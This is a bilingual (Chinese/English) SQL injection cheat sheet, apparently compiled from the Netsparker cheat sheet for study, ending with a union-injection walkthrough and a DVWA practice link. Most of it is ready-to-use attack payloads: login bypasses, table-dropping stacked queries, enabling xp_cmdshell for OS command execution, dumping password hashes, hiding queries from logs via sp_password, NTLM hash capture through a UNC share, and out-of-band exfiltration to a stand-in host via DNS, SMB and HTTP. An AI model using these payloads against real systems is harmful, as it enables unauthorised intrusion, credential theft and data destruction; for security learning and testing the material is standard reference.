# SQL 注入

## 注入方式
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
### Line Comments（行注释）
- 注释多余查询（Comments out rest of the query.）
```sql
-- 注释标识一， 两个短横线+一个空格
#注释标识二，井号
/* 注释标志三，C语言注释 */
-- 行注释实例： 
select * from members where username='admin'-- ' and password='password'
select * from members where username='admin'# ' and password='password'
```
### Inline Comments(行内注释)
```sql
drop/*Comment*/sampletable
dr/**/op/*bypass blacklisting*/sampletable
select/*avoid-spaces*/password/**/from/**/members

# 特殊注释查询
/*
 Mysql的特殊注释查询/*!Mysql Special SQL */
 */
select /*!32302 1/0, */ 1 from tablename -- 其中只有3.23.02及以上的版本才执行

# 查询优化器
/*+ 优化器 */

```

### Stacking Queries(多语句查询)
```sql
select * from members; drop members-- 
/*
 * PHP-MySQL doesn't support stacked queries.
 * Jave doesn't support stacked queries(I'm sure for Oracle. not quite sure about other databases).
 */
-- Stacked SQL Injection Attack Samples
-- ID: 10; drop members --
select * from products where id = 10; drop members-- 
```
### If Statements(If语法)
```sql
-- Mysql If Statement
if(condition, true-part,false-part)
select if(1=1,'true','false')

-- SQL Server If Statement
-- if condition true-part else false-part
IF (1=1) select 'true' else select 'false'

-- Oracle If Statecoment
-- Begin if condition then true-part; else false-part; end if end
if (1=1) then dbms_lock.sleep(3); else dbms_lock.sleep(0); end if end

-- PostgreSQL If Statement
-- select case when condition then true-part else false-part end;
select case when (1=1) then 'A' else 'B' end;

--If Statement SQL Injection Attack Samples
if ((select user) = 'sa') or (select user) = 'dbo') select 1 else select 1/0
```

### Using Integers
```sql
/*
 * Very useful for bypassing,magic_quotes() and similar filters. or even WAFs
 * 0xHEXNUMBER(SM)
 * You can write hex like theese:
 * select char(0x66)(S)
 * select 0x5045(This is not an intger it will be a string from Hex)(M)
 * select 0x50 + 0x45(This is ingteger now!)(M)
 */
```

### String Operations(字符串运算)
```sql
/*
 * + (S)
 * select login + '-' + password from members
 * || (*MO)
 * select login || '-' || password from members
 * About MySQL "||"
 * If MySQL is running in ANSI mode it's going to work but otherwise MySQL accept is as 'logical operator' it'll return 0. A better way to do it is using CONCAT() function in MySQL.
 * concat(str1, str2, str3, str4, ...)(M)
 */
 
-- Strings without Quotes
-- 0x457578
select 0x457578 -- (M)
select concat('o0x', HEX('c:\\boot.ini')) -- (M)
select concat(char(75), char(76), char(77)) -- (M)
select char(75)+char(76)+char(77) -- (S)
select char(75)||char(76)||char(77) -- (O)
select (char(75)||char(76)||char(77))-- (P)

-- Hex based SQL Injection Samples
select load_file(0x633A5C626F6F742E696369) -- (M)

-- String Modification & Related
# ASCII() -- (SMP)
# char() -- (SM)

```

### Bypassing Login Screens (SMO+)
```sql
-- SQL Injection 101, Login tricks
# admin' -- 
# admin' # 
# admin' /*
# ' or 1=1-- 
# ' or 1=1#
# ' or 1=1/*
# ') or '1'='1--
# ') or ('1'='1--
# Login as different user(SM*)
#   ' union select 1, 'anotheruser','doesnt metter', 1--

-- Bypassing second MD5 hash check login screens
# admin' and 1=0 union all select 'admin','81dc9bdb52d04dc20036dbd8313ed055'

```

### Error Base - Find columns Names
```sql
-- Finding Columns Names with HAVING BY - Error Base(S)
# ' HAVING 1=1 --
# ' GROUP BY table.columnfromerror1 having 1=1 --
# ' Group by table.columnfromerror1,columnfromerror2 having 1=1 --
# ' Group by table.columnfromerror1,columnfromerror2,columnfromerror(n) having 1=1 --
# And so on.
# If you are not getting any more error the it's done.

-- Finding how many columns in SELECT query by ORDER BY(MOS+)
# order by 1--
# order by 2--
# order by n--
# Keep going until get an error. Error means you found the number of selectd columns
```

### Data Types,UNION, etc.
```sql
-- Hints:
# Always use UNION whit ALL because of image similar non-distinct field types.By default union tries to get records whit distinct
# To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time
# Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc
#   Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)

-- Finding Column Type
# ' union select sum(columntofind) from users --(S)
/*
 * Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
 * [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument. 
 * If you are not getting an error it means column is numeric
 */
# Also you can use CAST() or CONVERT()
/*
 * select * from table1 where id = -1 union all select null,null,null,null,convert(image,1),null--
 */
# 11223344) union select null,null,null,null where 1=2-- No Error - Syntax is right. MS SQL SERVER used. Procceeding
# 11223344) union select 1,null,null where 1=2-- No Error - First column is an integer
# 11223344) union select 1,2,null,null where 1=2-- Error - Second column is not an integer
# 11223344) union select 1,'2',null,null where 1=2-- No Error - second column is a string.
# 11223344) union select 1,'2',3,null where 1=2-- Error - Third column is not an integer
/*
Microsoft OLE DB Provider for SQL Server error '80040e07' 
Explicit conversion from data type int to image is not allowed.
*/
```

### Simple Insert(MSO+)
```sql
';insert into users values(1,'hax0r', 'coolpass',9) /*
```

### Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes
```sql
-- @@version(MS)
insert into member(id,user,pass) values(1,''+substring(@@version,1,10), 10)

-- Bulk Insert(S)
/*Insert a file content to a table. If you don't know internal path of web application you can read IIS (IIS 6 only) metabase file(%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path.

    Create table foo( line varchar(8000) )
    bulk insert foo from 'c:\inetpub\wwwroot\login.asp'
    Drop temp table, and repeat for another file.
*/

-- BCP(s)
# Write text file.Login Credentials are required to use this function
bcp "select * from test..foo" queryout "c:\runcommand.asp" -c -Slocalhost -Usa -Pfoobar

-- VBS,WSH in SQL Server(S)
# You can use VBS,WSH scripting in SQL Server because of ActiveX support.
declare @o int 
exec sp_oacreate 'wscript.shell', @o out 
exec sp_oamethod @o, 'run', NULL, 'notepad.exe' 
Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- 

-- Executing system commands.xp_cmdshell(S)
# Well known trick, By default it's disabled in SQL Server 2005. You need to have admin access
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
# You can not read results directly from error or union or something else.

-- Some Special Tables in SQL Server(S)
# Error Messages
master..systemessages
# Linked Servers
master..sysservers
# Password(2000 and 2005 both can be crackable, they use very similar hashing algorighm)
SQL Server 2000: master..sysxlogins
SQL Server 2005: sys.sql_logins

-- More Stored Procedures for SQL Server(S)
# Cmd Execute(xp_cmdshell)
exec master.dbo.xp_cmdshell 'dir'
# Registry Stuff(xp_regread)
xp_regaddnultistring
xp_regdeletekey
xp_regdeletevalue
xp_regenumkeys
xp_regenumvalues
xp_regread
xp_regremovemultistring
xp_regwrite
  exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares' 
exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'
# Managing Services(xp_servicecontrol)
# Medias(xp_availablemedia)
# ODBC Resources(xp_enumdsn)
# Login mode(xp_loginconfig)
# Creating Cab Files(xp_makecab)
# Domain Enumeration(xp_ntsec_enumdomains)
# Process Killing(Need PID)(xp_terminate_process)
# Add new procedure(virtually you can execute whatever you want)
#    sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'
#    exec xp_webserver
# Write text file to UNC or an internal path(sp_makewebtask)

-- MSSQL Bulk Notes
select * from master..sysprocesses /*where spid=@@spid*/
declare @result int; exec @result = xp_cmdshell 'dir *.exe'; if(@result = 0) select 0 else sleect 1/0

HOST_NAME()
IS_MEMBER(Transact-SQL)
IS_SRVROLEMEMBER(Transact-SQL)
OPENDATASOURCE(Transact-SQL)
insert tbl exec master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"

-- SQL Injection in LIMIT(M) or ORDER(MSO)
select id,product from test.test t limit 0,0 union all select 1,'x'/*,10;
# If injection is in second limit you can comment it out or use in your union injection

-- Shutdown SQL Server(S)
'; shutdown --

-- Enabling xp_cmdshell in SQL Server 2005
# By default xp_cmdshell and couple of other potentially dangerous stored procedures are disabled in SQL Server 2005. If you have admin access then you can enable these.
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXCE sp_configure 'xp_cmdshell',1
RECONFIGURE

-- Finding Database Structure in SQL Server(S)
# Getting User defined Tables
select name from sysobjects where xtype='U'
# Getting Column Names
select name from syscolumns where id = (select id from sysobjects where name = 'tablenameforcolumnnames')

```

### Moving records(S)
```sql
-- Modify where and use NOT IN or NOT EXIST
... where users not in ('First User','Second User')
select top 1 name from members where not exist(select top 0 name from members) -- very good one

-- Using Dirty Tricks
select * from product where id = 2 and 1=cast((select p.name from (select (select count(i.id) as rid from sysobjects i where i.id<=0.id) as x, name from sysobjects 0) as p where p.x=3) as int
Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21

-- Fast way to extract data from Error Based SQL Injections in SQL Server(S)
';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--

-- Finding Database Structure in MySQL(M)
# Getting User defined Tables
select table_name from information_schema.tables where tables_schema = 'databasename'
# Getting Column Names
select table_name,column_name from information_schema.columns where table_name = 'tablename'

-- Finding Database Structre in Oracle(O)
# Getting User defined Tables
select * from all_tables where owner = 'database_name'
# Getting Column Names
select * from all_col_comments where table_name ='table'

```

### Blind SQL Injection
```sql 
/*
 * About Blind SQL Injections
 * In a quite good production application generally you can not see error responses on the page,so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injection.
 * Normarl Blind
 *   You can not see a response in the page,but you can still datermine result of a query from reponse or HTTP status code
 * Totally Blind
 *   You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common,thought.
 * In normal blinds you can use "if statements" or abuse WHERE query in injection(generally easier),in totally blinds you need to use some waiting functions and analyze response times. For thsi you can use WAITFOR DALAY '0:0:10' in SQL Server, BENCHMARK() and SLEEP(10) in MySQL,PG_SLEEP(10) in PostgreSQL, and some PL/SQL tricks in ORACE.
 */ 
 
-- Real and a bit Comples Blind SQL Injection Attack Sample
#This output taken from a real private Blind SQL Injection tool while exploiting SQL Server back ended application and enumerating table names. This requests done for first char of the first table name. SQL queries a bit more complex then requirement because of automation reasons. In we are trying to determine an ascii value of a char via binary search algorithm.
# TRUE and False flags mark queries returned true or false
TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78--
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103--

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)

-- Making Databases Wait/Sleep For Blind SQL Injection Attacks
# First of all use this if it's really blind, otherwise just use 1/0 style errors to identify difference. Second, be careful while using times more than 20-30 seconds. database API connection or script can be timeout.
# WAITFOR DELAY 'time' (S)
# This is just like sleep, wait for specified time. CPU safe way to make database wait.
WAITFOR DELAY '0:0:10'-- 
# Also,you can use fractions like this
WAITFOR DELAY '0:0:0.51'

-- Real World Samples
# Are we 'sa'?
if (select user) = 'sa' waitfor delay '0:0:10'
# Productid =1;waitfor delay '0:0:10'-- 
# ProductID =1);waitfor delay '0:0:10'--
# ProductID =1';waitfor delay '0:0:10'--
# ProductID =1');waitfor delay '0:0:10'--
# ProductID =1));waitfor delay '0:0:10'--
# ProductID =1'));waitfor delay '0:0:10'--

# BENCHMARK()(M)
# Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!
BENCHMARK(howmanytimes, to this)
-- Real World Samples
# Are we root? woot!
if exists (select * from users where username = 'root') BENCHMARK(1000000000,MD5(1))
# Check Table exist in MySQL
if (select * from login) BENCHMARK(1000000000,MD5(1))

```

### Covering Your Tracks
```sql
SQL Server - sp_password log bypass(S)
SQL Server don't log queries that includes sp_password for security reaonse(!). So if you add --sp_password to your queries it will not be in SQL Server logs(of curse still will be in web server logs. try to use POST if it's possible)
```

### Clear SQL Injection Tests
```sql
#These tests are simply good for blind sql injection and silent attacks.
-- product.asp?id=4 (SMO)
product.asp?id=5-1
product.asp?id=4 or 1=1

-- product.asp?name=Book
product.asp?name=Bo'%2b'ok
product.asp?name=Bo' || 'ok (OM)
product.asp?name=Book' or 'x'='x
```

### Extra MySQL Notes
```sql
# Sub Queries are working only MySQL 4.1+
# Users
select user,password from mysql.user
select 1,1 union select if(substring(password,1,1)='2',Benchmark(100000,sha1(1)),0) user,password from mysql.user where user='root';
# select ect ... into dumpfile
# write query into a new file(can not modify existing files)

-- UDF Function
create function LockWorkStation returns integer soname 'user32';
select LockWorkStation();
create function ExitProcess returns integer soname 'kernel32';
select ExitProcess();
select User();
select password,User() from mysql.user;
# First byte of admin hash
select substring(user_password,1,1) from mb_users where user_group = 1;
# Read File
query.php?user=1+union+select+load_file(ox63...),1,1,1,1,1
# MySQL Load Data infile
# By default it's not available!
create table foo(line blob);load data infile 'c:/boot.ini' into table foo;select * from foo;
# More Timing in MySQL
select benchmark(500000, sha1('test'));
query.php?user=1+union+select+benchmark(500000,sha1(0x414141)),1,1,1,1
select if( user() like 'root@%',benchmark(100000,sha1('test')),'false');

# Enumeration data, Guessed Brute Force
select if( (ascii(substring(user(),1,1)) >> 7) & 1,benchmark(100000,sha1('test')), 'false');

#Potentially Useful MySQL Functions
md5() -- md5 hashing
sha1() -- sha1 hashing
password()
encode()
compress() -- Compress data,can be great in large binary reading in Blind SQL Injections.
row_count()
schema()
version() -- same as @@version

```

## Second Order SQL Injection (二阶段SQL注入)
```sql
# Basically.you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem.
# Name: ' + (select top 1 password from users) + '
# Email: xx@xx.com

/*
If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.
Forcing SQL Server to get NTLM Hashes

This attack can help you to get SQL Server user's Windows password of target server, but possibly you inbound connection will be firewalled. Can be very useful internal penetration tests. We force SQL Server to connect our Windows UNC Share and capture data NTLM session with a tool like Cain & Abel.
Bulk insert from a UNC Share (S) 

Check out Bulk Insert Reference to understand how can you use bulk insert
 */
bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'
```

### Out of Band Channel Attacks
```sql
-- SQL Server
?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECTION})+'.yourhost.com';'sa';'pwd', 'SELECT 1')
Makes DNS resolution request to {INJECT}.yourhost.com

?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECTION})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q
Makes DNS resolution request to {INJECTION}.yourhost.com

{INJECTION} = You want to run the query.

-- MySQL


    ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\')))
    Makes a NBNS query request/DNS resolution request to yourhost.com

    ?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')
    Writes data to your shared folder/file

    {INJECTION} = You want to run the query.
-- Oracle


?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ sniff.php?sniff='||({INJECTION})||'') FROM DUAL)
Sniffer application will save results

?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '||({INJECTION})||'.html') FROM DUAL)
Results will be saved in HTTP access logs

?vulnerableParam=(SELECT UTL_INADDR.get_host_addr(({INJECTION})||'.yourhost.com') FROM DUAL)
You need to sniff dns resolution requests to yourhost.com

?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT(({INJECTION})||'.yourhost.com',80) FROM DUAL)
You need to sniff dns resolution requests to yourhost.com

{INJECTION} = You want to run the query.

```

## 注入方法
1) 联合查询注入
2) 报错注入
?id=1' and updatexml(1,(concat('^',database(),'^')),1) --
3) 延迟注入
4) BOOL盲注
## 常用SQL注入字符
```SQL
` . ' " ) ] } / \ --
```
## Firefox 黑客工具栏
- Hackbar
## 联合查询注入
1) 看页面URL地质是否有后台传参动作
2) 构造传参值  ?id=51' 验证输入后台是否能够解析
3) and 1=1判断页面是否正常； and 1=2 判断页面是否部分报错; or 1=1 
4) order by 5 (5可以是其他数字，找到报错和不报错的临界点，取不报错的最大值)
5) union select 1,2,3,4,5,6,7 --+ 
- --+指注释掉插入攻击语句后的所有代码
- 匹配order by 验证出来的列数
- 联合查询时，前面Id的值要用负数（-5）
6) union select 1,2,3,4,5,6,构造语句,7
- database()  当前使用的数据库名称
- user()      当前登陆数据库的用户
- @@version   当前数据库版本
- @@basedir   查看路径
7) 爆库   查看当前数据库中有哪些表
```SQL
(select group_concat(table_name) from information_schema.tables where table_schema=0xxxx)
-- table_schema 的值需要输入16进制
```
8) 爆表   找到疑似关键信息的表
9) 查询表的列
```SQL
(select group_concat(column_name) from information_schema.columns where table_schema=0xxxx and table_name=0xxxx)
-- table_schema 和 tabale_name 的值需要输入16进制
```
10) 爆数据  查询表中的数据
```SQL
(select group_concat(concat(column1, column2, '%23')) from table_name)
-- %23 是URL编码
```

## PHP攻击练习工具
![DVWA](https://github.com/digininja/DVWA)
